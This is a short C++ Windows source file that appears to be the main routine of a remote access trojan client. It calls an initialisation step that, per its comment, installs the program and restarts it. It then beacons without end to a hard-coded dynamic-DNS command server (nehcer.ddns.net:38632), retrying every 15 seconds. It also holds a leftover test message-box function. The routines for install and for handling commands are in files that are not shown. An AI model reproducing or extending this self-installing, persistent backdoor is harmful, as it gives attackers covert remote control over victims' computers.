/*

					SETTINGS CAN BE EDITED IN "settings.cpp"

*/

#include "general.h"



//TESTFUNC

void testMB(std::string s)		//TEST FUNCTION
{
	MessageBox(0, s.c_str(), "THIS IS A TEST", 0);
}

//END TESTFUNC


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	//VARIABLE SETUP
	General::lpArguments = lpCmdLine;


	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
		return 0;

	Client MyClient("nehcer.ddns.net", 38632);

	while (true)
	{
		if (!MyClient.connected)
		{
			while (!MyClient.Connect())
			{
				Sleep(15000);
			}
		}
		Sleep(15000);
	}

	//test stuff (WORKS \o/)

	return 0;
}